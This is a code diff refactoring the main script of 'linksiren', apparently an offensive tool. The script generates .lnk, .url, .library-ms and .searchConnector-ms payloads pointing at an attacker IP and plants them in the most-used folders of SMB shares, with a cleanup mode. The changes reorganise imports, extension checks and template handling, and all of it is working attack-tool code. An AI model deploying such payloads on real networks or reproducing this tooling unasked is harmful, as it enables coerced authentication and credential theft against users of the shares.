@@ -7,9 +7,11 @@ bulk cleanup multiple types of payloads from the identified locations.
 """
 import json
 import argparse
-from smbclient import ClientConfig
+from datetime import datetime
 from pathlib import Path
-from linksiren.functions import read_targets, get_sorted_rankings, filter_targets, is_valid_payload_name, write_payload_remote, write_payload_local, delete_payload, write_list_to_file, create_lnk
+from smbclient import ClientConfig
+from linksiren.impure_functions import read_targets, get_sorted_rankings, write_payload_remote, write_payload_local, delete_payload, write_list_to_file, get_lnk_template
+from linksiren.pure_functions import filter_targets, is_valid_payload_name, create_lnk_payload, compute_threshold_date
 
 def main():
     """
@@ -120,20 +122,22 @@ def main():
 
     if args.mode == 'generate':
         # Validate the provided payload name and exit if it's invalid
-        available_extensions = ['searchConnector-ms', 'library-ms', 'url', 'lnk']
+        available_extensions = ['.searchConnector-ms', '.library-ms', '.url', '.lnk']
         if not is_valid_payload_name(args.payload, available_extensions):
             return
 
         # Select a template file name based on the payload name
-        template_name = Path(__file__).parent / f'template.{args.payload.split(".")[-1]}'
+        payload_extension = Path(args.payload).suffix
+        template_path = Path(__file__).parent / f'template.{payload_extension}'
 
-        if template_name == 'template.lnk':
-            payload_contents = create_lnk(args.attacker)
+        if payload_extension == '.lnk':
+            lnk_template = get_lnk_template(template_path)
+            payload_contents = create_lnk_payload(args.attacker, lnk_template)
 
         else:
             # Read the payload template contents into a file and substitute the connection string
             # to the attacker as appropriate.
-            with open(template_name, 'r', encoding="utf-8") as template_file:
+            with open(template_path, 'r', encoding="utf-8") as template_file:
                 payload_contents = template_file.read()
                 payload_contents = payload_contents.format(attacker_ip=args.attacker)
 
@@ -161,7 +165,9 @@ def main():
         # Read share targets into an array
         targets = read_targets(args.targets)
 
-        sorted_rankings = get_sorted_rankings(targets, args.active_threshold, args.max_depth,
+        threshold_date = compute_threshold_date(datetime.now(), args.active_threshold)
+
+        sorted_rankings = get_sorted_rankings(targets, threshold_date, args.max_depth,
                                               args.fast)
         filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)
 
@@ -183,17 +189,19 @@ def main():
             return
 
         # Select a template file name based on the payload name
-        template_name = f'template.{args.payload.split(".")[-1]}'
+        payload_extension = Path(args.payload).suffix
+        template_path = Path(__file__).parent / f'template.{payload_extension}'
 
-        if template_name == 'template.lnk':
-            payload_contents = create_lnk(args.attacker)
+        if payload_extension == '.lnk':
+            lnk_template = get_lnk_template(template_path)
+            payload_contents = create_lnk_payload(args.attacker, lnk_template)
 
         else:
             # Read the payload template contents into a file and substitute the connection string
             # to the attacker as appropriate.
-            with open(template_name, 'r', encoding="utf-8") as template_file:
-                payload_contents = template_file.read()
-                payload_contents = payload_contents.format(attacker_ip=args.attacker)
+            with open(template_path, 'r', encoding="utf-8") as template_file:
+                template_contents = template_file.read()
+                payload_contents = template_contents.format(attacker_ip=args.attacker)
 
         # Iterate over each target folder path
         for folder_unc in targets:
